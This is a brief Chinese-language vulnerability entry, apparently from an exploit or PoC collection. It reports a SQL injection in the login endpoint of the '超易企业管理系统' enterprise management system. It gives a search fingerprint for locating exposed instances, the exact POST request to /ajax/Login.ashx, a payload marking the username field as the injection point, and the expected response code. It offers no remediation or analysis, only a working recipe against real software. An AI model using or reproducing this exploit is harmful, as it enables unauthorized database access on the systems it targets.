# 超易企业管理系统存在SQL注入漏洞

超易企业管理系统 ｜ SQL注入 ｜ —
- **指纹**：`"超易企业管理系统"`
- **请求**：`POST /ajax/Login.ashx?Date=%271721821198459%27 HTTP/1.1`

**Payload**
```
username=admin*&password=admin123&loginguid=&logintype=pc
```
- **响应特征**：200